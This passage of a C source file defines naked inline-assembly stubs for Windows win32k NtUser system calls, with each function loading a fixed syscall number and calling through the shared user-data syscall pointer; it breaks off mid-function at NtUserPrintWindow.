__declspec(naked) ULONG NTAPI NtUserClipCursor()
{
    __asm {
        mov eax, 00001149h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCloseClipboard()
{
    __asm {
        mov eax, 0000114Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserCloseDesktop()
{
    __asm {
        mov eax, 0000114Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCloseWindowStation()
{
    __asm {
        mov eax, 0000114Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserConsoleControl()
{
    __asm {
        mov eax, 0000114Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserConvertMemHandle()
{
    __asm {
        mov eax, 0000114Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCopyAcceleratorTable()
{
    __asm {
        mov eax, 0000114Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCountClipboardFormats()
{
    __asm {
        mov eax, 00001150h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateAcceleratorTable()
{
    __asm {
        mov eax, 00001151h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateCaret()
{
    __asm {
        mov eax, 00001152h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateDesktop()
{
    __asm {
        mov eax, 00001153h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateInputContext()
{
    __asm {
        mov eax, 00001154h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateLocalMemHandle()
{
    __asm {
        mov eax, 00001155h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateWindowEx()
{
    __asm {
        mov eax, 00001156h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000003Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateWindowStation()
{
    __asm {
        mov eax, 00001157h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDdeGetQualityOfService()
{
    __asm {
        mov eax, 00001158h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDdeInitialize()
{
    __asm {
        mov eax, 00001159h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserDdeSetQualityOfService()
{
    __asm {
        mov eax, 0000115Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDeferWindowPos()
{
    __asm {
        mov eax, 0000115Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserDefSetText()
{
    __asm {
        mov eax, 0000115Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserDeleteMenu()
{
    __asm {
        mov eax, 0000115Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyAcceleratorTable()
{
    __asm {
        mov eax, 0000115Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyCursor()
{
    __asm {
        mov eax, 0000115Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyInputContext()
{
    __asm {
        mov eax, 00001160h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyMenu()
{
    __asm {
        mov eax, 00001161h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyWindow()
{
    __asm {
        mov eax, 00001162h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDisableThreadIme()
{
    __asm {
        mov eax, 00001163h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDispatchMessage()
{
    __asm {
        mov eax, 00001164h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDragDetect()
{
    __asm {
        mov eax, 00001165h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDragObject()
{
    __asm {
        mov eax, 00001166h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawAnimatedRects()
{
    __asm {
        mov eax, 00001167h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawCaption()
{
    __asm {
        mov eax, 00001168h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawCaptionTemp()
{
    __asm {
        mov eax, 00001169h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawIconEx()
{
    __asm {
        mov eax, 0000116Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawMenuBarTemp()
{
    __asm {
        mov eax, 0000116Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserEmptyClipboard()
{
    __asm {
        mov eax, 0000116Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnableMenuItem()
{
    __asm {
        mov eax, 0000116Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserEnableScrollBar()
{
    __asm {
        mov eax, 0000116Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserEndDeferWindowPosEx()
{
    __asm {
        mov eax, 0000116Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserEndMenu()
{
    __asm {
        mov eax, 00001170h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserEndPaint()
{
    __asm {
        mov eax, 00001171h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnumDisplayDevices()
{
    __asm {
        mov eax, 00001172h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnumDisplayMonitors()
{
    __asm {
        mov eax, 00001173h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnumDisplaySettings()
{
    __asm {
        mov eax, 00001174h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserEvent()
{
    __asm {
        mov eax, 00001175h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserExcludeUpdateRgn()
{
    __asm {
        mov eax, 00001176h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserFillWindow()
{
    __asm {
        mov eax, 00001177h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserFindExistingCursorIcon()
{
    __asm {
        mov eax, 00001178h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserFindWindowEx()
{
    __asm {
        mov eax, 00001179h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserFlashWindowEx()
{
    __asm {
        mov eax, 0000117Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAltTabInfo()
{
    __asm {
        mov eax, 0000117Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAncestor()
{
    __asm {
        mov eax, 0000117Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAppImeLevel()
{
    __asm {
        mov eax, 0000117Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAsyncKeyState()
{
    __asm {
        mov eax, 0000117Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAtomName()
{
    __asm {
        mov eax, 0000117Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCaretBlinkTime()
{
    __asm {
        mov eax, 00001180h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCaretPos()
{
    __asm {
        mov eax, 00001181h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClassInfo()
{
    __asm {
        mov eax, 00001182h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClassName()
{
    __asm {
        mov eax, 00001183h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardData()
{
    __asm {
        mov eax, 00001184h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardFormatName()
{
    __asm {
        mov eax, 00001185h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardOwner()
{
    __asm {
        mov eax, 00001186h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardSequenceNumber()
{
    __asm {
        mov eax, 00001187h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardViewer()
{
    __asm {
        mov eax, 00001188h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipCursor()
{
    __asm {
        mov eax, 00001189h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetComboBoxInfo()
{
    __asm {
        mov eax, 0000118Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetControlBrush()
{
    __asm {
        mov eax, 0000118Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetControlColor()
{
    __asm {
        mov eax, 0000118Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCPD()
{
    __asm {
        mov eax, 0000118Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCursorFrameInfo()
{
    __asm {
        mov eax, 0000118Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCursorInfo()
{
    __asm {
        mov eax, 0000118Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetDC()
{
    __asm {
        mov eax, 00001190h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetDCEx()
{
    __asm {
        mov eax, 00001191h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetDoubleClickTime()
{
    __asm {
        mov eax, 00001192h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetForegroundWindow()
{
    __asm {
        mov eax, 00001193h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetGuiResources()
{
    __asm {
        mov eax, 00001194h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetGUIThreadInfo()
{
    __asm {
        mov eax, 00001195h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetIconInfo()
{
    __asm {
        mov eax, 00001196h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetIconSize()
{
    __asm {
        mov eax, 00001197h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetImeHotKey()
{
    __asm {
        mov eax, 00001198h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetImeInfoEx()
{
    __asm {
        mov eax, 00001199h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetInternalWindowPos()
{
    __asm {
        mov eax, 0000119Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyboardLayoutList()
{
    __asm {
        mov eax, 0000119Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyboardLayoutName()
{
    __asm {
        mov eax, 0000119Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyboardState()
{
    __asm {
        mov eax, 0000119Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyNameText()
{
    __asm {
        mov eax, 0000119Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyState()
{
    __asm {
        mov eax, 0000119Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetListBoxInfo()
{
    __asm {
        mov eax, 000011A0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMenuBarInfo()
{
    __asm {
        mov eax, 000011A1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMenuIndex()
{
    __asm {
        mov eax, 000011A2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMenuItemRect()
{
    __asm {
        mov eax, 000011A3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMessage()
{
    __asm {
        mov eax, 000011A4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMouseMovePointsEx()
{
    __asm {
        mov eax, 000011A5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetObjectInformation()
{
    __asm {
        mov eax, 000011A6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetOpenClipboardWindow()
{
    __asm {
        mov eax, 000011A7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetPriorityClipboardFormat()
{
    __asm {
        mov eax, 000011A8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetProcessWindowStation()
{
    __asm {
        mov eax, 000011A9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputBuffer()
{
    __asm {
        mov eax, 000011AAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputData()
{
    __asm {
        mov eax, 000011ABh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputDeviceInfo()
{
    __asm {
        mov eax, 000011ACh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputDeviceList()
{
    __asm {
        mov eax, 000011ADh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRegisteredRawInputDevices()
{
    __asm {
        mov eax, 000011AEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetScrollBarInfo()
{
    __asm {
        mov eax, 000011AFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetSystemMenu()
{
    __asm {
        mov eax, 000011B0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetThreadDesktop()
{
    __asm {
        mov eax, 000011B1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetThreadState()
{
    __asm {
        mov eax, 000011B2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetTitleBarInfo()
{
    __asm {
        mov eax, 000011B3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetUpdateRect()
{
    __asm {
        mov eax, 000011B4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetUpdateRgn()
{
    __asm {
        mov eax, 000011B5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetWindowDC()
{
    __asm {
        mov eax, 000011B6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetWindowPlacement()
{
    __asm {
        mov eax, 000011B7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetWOWClass()
{
    __asm {
        mov eax, 000011B8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserHardErrorControl()
{
    __asm {
        mov eax, 000011B9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserHideCaret()
{
    __asm {
        mov eax, 000011BAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserHiliteMenuItem()
{
    __asm {
        mov eax, 000011BBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserImpersonateDdeClientWindow()
{
    __asm {
        mov eax, 000011BCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserInitialize()
{
    __asm {
        mov eax, 000011BDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserInitializeClientPfnArrays()
{
    __asm {
        mov eax, 000011BEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserInitTask()
{
    __asm {
        mov eax, 000011BFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000030h
    }
}

__declspec(naked) ULONG NTAPI NtUserInternalGetWindowText()
{
    __asm {
        mov eax, 000011C0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserInvalidateRect()
{
    __asm {
        mov eax, 000011C1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserInvalidateRgn()
{
    __asm {
        mov eax, 000011C2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserIsClipboardFormatAvailable()
{
    __asm {
        mov eax, 000011C3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserKillTimer()
{
    __asm {
        mov eax, 000011C4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserLoadKeyboardLayoutEx()
{
    __asm {
        mov eax, 000011C5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserLockWindowStation()
{
    __asm {
        mov eax, 000011C6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserLockWindowUpdate()
{
    __asm {
        mov eax, 000011C7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserLockWorkStation()
{
    __asm {
        mov eax, 000011C8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserMapVirtualKeyEx()
{
    __asm {
        mov eax, 000011C9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserMenuItemFromPoint()
{
    __asm {
        mov eax, 000011CAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserMessageCall()
{
    __asm {
        mov eax, 000011CBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserMinMaximize()
{
    __asm {
        mov eax, 000011CCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserMNDragLeave()
{
    __asm {
        mov eax, 000011CDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserMNDragOver()
{
    __asm {
        mov eax, 000011CEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserModifyUserStartupInfoFlags()
{
    __asm {
        mov eax, 000011CFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserMoveWindow()
{
    __asm {
        mov eax, 000011D0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserNotifyIMEStatus()
{
    __asm {
        mov eax, 000011D1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserNotifyProcessCreate()
{
    __asm {
        mov eax, 000011D2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserNotifyWinEvent()
{
    __asm {
        mov eax, 000011D3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenClipboard()
{
    __asm {
        mov eax, 000011D4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenDesktop()
{
    __asm {
        mov eax, 000011D5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenInputDesktop()
{
    __asm {
        mov eax, 000011D6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenWindowStation()
{
    __asm {
        mov eax, 000011D7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserPaintDesktop()
{
    __asm {
        mov eax, 000011D8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserPeekMessage()
{
    __asm {
        mov eax, 000011D9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserPostMessage()
{
    __asm {
        mov eax, 000011DAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserPostThreadMessage()
{
    __asm {
        mov eax, 000011DBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserPrintWindow()
{
    __asm {
